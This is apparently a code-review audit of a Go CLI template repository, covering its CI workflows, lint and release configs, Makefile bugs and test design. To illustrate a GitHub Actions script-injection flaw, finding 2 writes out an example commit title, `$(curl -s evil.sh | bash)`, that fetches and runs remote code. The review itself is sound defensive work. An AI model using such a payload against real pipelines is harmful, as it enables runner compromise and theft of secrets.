# Code review iteration

Reviewed the whole repository at commit `07077ca 2023-12-28` as a GitHub template for Go CLI tools: the template is the product, so the review covers the Go sources (`main.go`, `internal/…`, tests), module files (`go.mod`, `tools/go.mod`), the Makefile and Taskfile machinery, all GitHub Actions workflows and the composite notify action, `.golangci.yml`, `.goreleaser.yml`, and the Nextra docs stack. The angle is a modernization audit against the 2026 ecosystem (Go 1.25/1.26, golangci-lint v2, GoReleaser v2, current Actions practice). `.github/issues/` and `.github/roadmap/` were ignored as offline backlog dumps. No previous review files existed in `.github/reviews/`, so all findings below are new.

Severity: **Crit** / **High** / **Med** / **Low** / **Nit**.
Class: `correctness` · `security` · `concurrency` · `perf` · `api` · `idiom` · `modern` · `test` · `build` · `docs`.

## Summary

## 1. Release job references a reusable workflow that does not exist

`.github/workflows/ci.yml:105-111`

```yaml
release:
  name: Distribution
  needs: [ test ]
  uses: ./.github/workflows/cd.dist.yml
```

There is no `cd.dist.yml` in `.github/workflows/`, and `git log --all -- .github/workflows/cd.dist.yml` shows it never existed. GitHub resolves reusable-workflow `uses:` references when the run is created, before job-level `if:` conditions are evaluated, so every CI run — including plain PR pushes that only need lint and test — fails at startup with "workflow was not found". The template's flagship CI pipeline is dead on arrival for anyone who generates a repository from it. Tag releases only work by accident because the standalone `cd.yml` (which duplicates the same GoReleaser logic) has its own `push: tags` trigger; note that `cd.yml` cannot be the retarget as-is because it lacks a `workflow_call:` trigger.

**Fix.** Either delete the `release` job from `ci.yml` and keep `cd.yml` as the single release path, or rename `cd.yml` to `cd.dist.yml`, add `workflow_call:` (with the `GORELEASER_TOKEN` secret declared) to it, and remove its independent `push: tags` trigger so a tag does not race two release pipelines.

## 2. Shell injection through commit message in the notify action

`.github/actions/notify/action.yml:26-53`

```yaml
run: |
  if [ '${{ github.event.head_commit.message != null }}' == 'true' ]
  then
    (cat <<-message
  txt=${{ github.event.head_commit.message }}
  message
  ) | head -1 >> $GITHUB_OUTPUT
```

`${{ github.event.head_commit.message }}` is textually substituted into the script before bash parses it — the canonical GitHub Actions script-injection pattern. The heredoc delimiter is unquoted, so `$(…)` and backticks inside the message are executed; worse, a multi-line commit message can close the heredoc early and append arbitrary script lines. Squash-merge commit messages embed the PR title, which is attacker-controlled: a contributor PR titled `$(curl -s evil.sh | bash)` executes on the main-branch runner after merge, with access to `secrets.SLACK_WEBHOOK` and the workflow's `github.token`. The same pattern repeats for `inputs.reason` and `workflow_run.name` at lines 36-46.

**Fix.** Never interpolate event payloads into `run:` scripts. Pass them through `env:` (e.g. `env: { MSG: '${{ github.event.head_commit.message }}' }`) and use `"$MSG"` in the script — environment expansion cannot inject script text. Also add a top-level `permissions: contents: read` to the calling workflows to shrink the blast radius.

## 3. The fast flag silently disables most configured linters

`.golangci.yml:1-19`

```yaml
linters:
  fast: true
  enable:
    - errcheck
    - gosimple
    ...
    - staticcheck
```

In golangci-lint v1, `linters.fast: true` filters the *enabled* set down to linters marked "fast". Nearly everything this config enables — `errcheck`, `gosimple`, `govet`, `staticcheck`, `unused`, `bodyclose`, `exhaustive`, `gocritic`, `noctx` — requires type information or SSA and is classified as slow, so the flag silently drops them. In practice the lint gate runs little more than `ineffassign`, while the config reads as if the full staticcheck family is active. This footgun is exactly why golangci-lint v2 removed the option in favor of an explicit `--fast-only` CLI flag. Additionally, `typecheck` (line 10) is not a real linter and cannot be enabled or disabled; listing it is a long-documented config anti-pattern.

**Fix.** Delete `fast: true` and the `typecheck` entry. When migrating to the v2 config format (see [[#5. Toolchain and ecosystem staleness across the whole template]]), verify the effective set with `golangci-lint linters` — do not trust the YAML by inspection alone.

## 4. Local and CI linting run different tools and the CI one is unpinned

`Makefile:206`, `tools/go.mod:16-20`, `.github/workflows/ci.yml:51-52`

```make
go-lint:
	$(AT) golangci-lint run --enable looppointer ./...
```

```
replace (
	github.com/golangci/golangci-lint => github.com/kamilsk/golangci-lint v1.55.2
	...
)
```

`looppointer` has never been an upstream golangci-lint linter (only its relaxed sibling `exportloopref` was accepted); it exists here only because `tools/go.mod` replaces golangci-lint with a personal fork that bundles it (`github.com/kyoh86/looppointer v0.2.1` appears in the indirect set). So `make lint` hard-depends on `github.com/kamilsk/golangci-lint` and fails with "no such linter" on stock installations. Meanwhile CI does not run `make lint` at all: `golangci-lint-action@v3.7.0` with no `version:` input downloads the *latest upstream release*, producing a different linter with a different linter set on every run. Today "latest" is golangci-lint v2.x, which rejects the v1 config outright — so even after fixing finding 1, the lint job fails. Three problems in one wiring: a hidden fork dependency, local/CI split-brain, and an unpinned tool in the reproducibility-obsessed part of the template.

**Fix.** Pin the linter version in the action (`with: { version: … }`) to the same version the tools module installs, and make CI run the same entrypoint developers run (`make lint`). Drop the fork: since Go 1.22 changed loop-variable capture semantics, both `looppointer` and `exportloopref` are obsolete — upstream's `copyloopvar` covers the residual case, eliminating the reason the fork exists.

## 5. Toolchain and ecosystem staleness across the whole template

`go.mod:3`, `tools/go.mod`, `Makefile:5`, `.github/workflows/*`, `.goreleaser.yml`, `docs/package.json`, `.github/settings.yml`

The template froze in December 2023, and effectively every layer is now one or two major versions behind. Consolidated inventory, with a migration outline:

- **Go toolchain.** `go 1.20` in `go.mod:3`, `GO_VERSIONS = 1.20 1.21` in `Makefile:5`, matrices `1.20.x/1.21.x` in `ci.yml:61-64` and `warmup.caches.yml`, and releases built with `go-version: 1.20.x` in `cd.yml:27`. Go 1.20/1.21 are long out of the two-release support window. Move to `go 1.25` + `toolchain` directive, test on `1.x` and `1.(N-1).x`, and build releases with the newest stable.
- **Archived mock library.** `github.com/golang/mock v1.6.0` (`go.mod:7`, blank-imported in `internal/deps_test.go:4`, installed via `tools/tools.go`) was archived in June 2023. Migrate to the maintained fork `go.uber.org/mock`.
- **Archived installer generator.** `goreleaser/godownloader` was archived years ago; `bin/install` is a script it generated in 2023-08 and only a personal fork (`tools/go.mod:18`) keeps it installable. Replace the curl-pipe installer story with GoReleaser's own install methods, `go install`, or GitHub's attestation-friendly release artifacts, and delete the fork replace.
- **GoReleaser v1 → v2.** `goreleaser v1.23` config uses removed/renamed keys: missing `version: 2` header, `brews.folder` → `directory` (`.goreleaser.yml:17`), `archives.format` → `formats`, and `Makefile:304`'s `--skip-publish` became `--skip=publish`.
- **golangci-lint v1 → v2.** `.golangci.yml` is v1-format (see also [[#3. The fast flag silently disables most configured linters]]); v2 requires `version: "2"` and a restructured `linters:` block; `gosimple` merged into `staticcheck`, `exportloopref` was removed.
- **tools.go pattern.** `tools/tools.go` + a 400-line `tools/go.mod` predates Go 1.24's `tool` directive (`go get -tool …`), which replaces the whole blank-import module, its three fork `replace` directives, and the `go generate`-driven install dance.
- **CI actions and services.** All actions are pinned to late-2023 patch releases (`checkout@v4.1.1`, `setup-go@v5.0.0`, …) — Dependabot config exists (`.github/dependabot.yml`) but its PRs evidently stopped being merged; `codecov-action@v3.1.4` (`ci.yml:123`) is deprecated and v3 tokenless uploads no longer work — v5 with a `CODECOV_TOKEN` is required; the probot Settings app behind `.github/settings.yml` is dead (the README already admits this in a footnote); `govulncheck` runs only in the release path (`cd.yml` → `fast-check`), not on the PR path, and CodeQL — "coming soon" in README since 2023 — is still absent.
- **Docs stack.** Next 14 + Nextra 2 + Node 20 (`docs/package.json`, `cd.docs.yml:39`); Nextra 4 changed its architecture (App Router), and Node 20 exits maintenance in 2026. Also `GOPROXY ?= direct` (`Makefile:95`) forfeits the module proxy's caching and availability shield for no stated reason.

**Fix.** One modernization pass in this order: bump Go and CI matrices → replace tools.go with the `tool` directive and drop all forks → migrate golangci-lint config to v2 and pin it → migrate GoReleaser config to v2 → swap golang/mock for uber-go/mock → fix codecov to v5 with token → delete settings.yml and the godownloader path → add CodeQL and a PR-path govulncheck job → refresh the docs stack. Then let Dependabot keep it current — the config is already right; the process wasn't.

## 6. Docs are deployed to production Pages from pull requests

`.github/workflows/ci.yml:96-103`

```yaml
publish:
  name: Documentation
  needs: [ test ]
  uses: ./.github/workflows/cd.docs.yml
  permissions:
    id-token: write
    pages: write
  if: true
```

`if: true` is a placeholder that gates nothing, so the docs build-and-deploy pipeline runs on *every* CI trigger — including `pull_request` — even though the CI paths filter means docs content did not change. Consequences: same-repo PRs deploy unreviewed documentation straight to the production GitHub Pages site (the `concurrency: docs` group in `cd.docs.yml` happily replaces the live deployment); fork PRs fail the job because `id-token: write` is not granted to forks, turning external contributions red for an unrelated reason. It also fully duplicates `cd.docs.yml`'s own `push: branches: [main], paths: docs/**` trigger.

**Fix.** Replace the placeholder with a real gate, e.g. `if: github.event_name == 'push' && github.ref == 'refs/heads/main'` — or simply delete the `publish` job and let `cd.docs.yml`'s own triggers own documentation delivery.

## 7. Broken uuidgen expansion makes go-check run the whole test suite

`Makefile:214`, `Makefile:271`

```make
go-check:
	$(AT) $(GOTEST) -count=1 -test.run=^$(uuidgen) ./...
```

`$(uuidgen)` is a *Make* variable reference, not a shell command substitution; no variable named `uuidgen` is defined anywhere, so it expands to the empty string and the flag becomes `-test.run=^` — a regex that matches **every** test. The intent (a random UUID that matches nothing, i.e. a compile-only smoke check) is inverted: `make go-check` — the first step of `fast-check` and CI's "Run fast check source code" step (`ci.yml:78-79`) — runs the entire test suite with `-count=1`, without `-race` and without the timeout discipline of `go-test`, then CI runs the tests *again* in the next step. Same bug at line 271: `go-performance-test` runs all unit tests alongside the benchmarks.

**Fix.** Use shell-level expansion or a static never-matching regex: `-test.run='^$$'` (Make-escaped `^$`) or `-test.run=^$(shell uuidgen)`. Same change at line 271.

## 8. No signal handling in the CLI entrypoint

`main.go:29-41`

```go
ctx, cancel := context.WithCancel(context.Background())
defer cancel()
...
safe.Do(func() error { return root.ExecuteContext(ctx) }, shutdown)
```

The context is only cancelled via `defer` on normal return, so it is functionally inert: on SIGINT/SIGTERM the Go runtime kills the process and no command ever observes cancellation. For a one-shot demo this is invisible, but this file is the template every generated tool copies — and real CLI tools do I/O, spawn processes, and need graceful Ctrl+C. `signal.NotifyContext` has been in the standard library since Go 1.16, so even by the era of this code the idiomatic entrypoint was a one-liner.

**Fix.** `ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM); defer cancel()`. Commands then inherit cancellation through `cmd.Context()` for free.

## 9. Exit-code assertions in main tests can silently never run

`main_test.go:12-32`

```go
t.Run("failure", func(t *testing.T) {
	exit = func(code int) { assert.Equal(t, 1, code) }
	stderr, stdout = io.Discard, io.Discard
	os.Args = []string{"root", "unknown"}
	main()
})
```

Two defects. First, the assertion lives inside the `exit` stub, and nothing verifies the stub was ever *called*: if `root.ExecuteContext` unexpectedly succeeded for `unknown`, `shutdown` would never fire and the "failure" test would pass green while observing nothing — a false-positive test guarding the template's only behavioral contract. Second, the subtests mutate package globals (`exit`, `stderr`, `stdout`, `os.Args`) and never restore them, so test outcomes depend on execution order, `t.Parallel()` can never be introduced, and any future test in the package inherits `os.Args = ["root", "unknown"]`.

**Fix.** Record invocation explicitly (`var called bool; exit = func(code int) { called = true; assert.Equal(t, 1, code) }; …; assert.True(t, called)`) and restore globals with `t.Cleanup` (snapshot old values, reassign on cleanup). Better still, restructure per [[#10. Mutable package globals as test seams in main]] so the test calls a `run()` function with injected writers and args instead of mutating globals around `main()`.

## 10. Mutable package globals as test seams in main

`main.go:20-27`

```go
var (
	commit  = unknown
	date    = unknown
	version = "dev"
	exit    = os.Exit
	stderr  = color.Error
	stdout  = color.Output
)
```

`commit/date/version` as ldflags targets are fine, but `exit`, `stderr`, and `stdout` are mutable globals whose only purpose is to be monkey-patched by tests — the pattern that causes finding 9. Today's idiom for CLI entrypoints is a thin `main` delegating to `func run(ctx context.Context, args []string, stdout, stderr io.Writer) int`, which makes the seams explicit parameters, keeps tests parallel-safe, and removes the global mutable state entirely. As template code, this shape gets replicated into every downstream tool.

**Fix.** Introduce `run(...) int` returning the exit code; `main` becomes `os.Exit(run(ctx, os.Args[1:], color.Output, color.Error))`. Tests call `run` directly with `io.Discard` writers and assert on the returned code — no stubs, no global mutation.

## 11. README install instructions use removed go get behavior

`README.md:194-199`, `README.md:70`

```bash
# use standard go tools
$ go get go.octolab.org/template/tool@latest
```

`go get` stopped building and installing binaries in Go 1.18; outside a module it is an error and inside one it only edits `go.mod`. The documented "standard" install path has not worked for years — for a template whose selling point is polished defaults, the very first thing a user copies fails. Nearby, line 70 suggests `make go-1.19` while `Makefile:5` only renders `go-1.20`/`go-1.21` Docker targets, so the documented command errors with "No rule to make target".

**Fix.** Replace with `go install go.octolab.org/template/tool@latest` and update the Docker example to a version present in `GO_VERSIONS` (or reference `make go-<version>` generically).

## 12. Dot import in the root command test

`internal/command/root_test.go:9`

```go
. "go.octolab.org/template/tool/internal/command"
```

A dot import of the package under test saves five characters on one `New()` call at the cost of unclear identifier origin; it is disallowed by default `revive`/`staticcheck` style checks that the template's own (intended) lint set would enforce, and it teaches downstream users a discouraged habit. External test packages should use a normal named import.

**Fix.** Import as `command "go.octolab.org/template/tool/internal/command"` (or rely on the package name) and call `command.New()`.
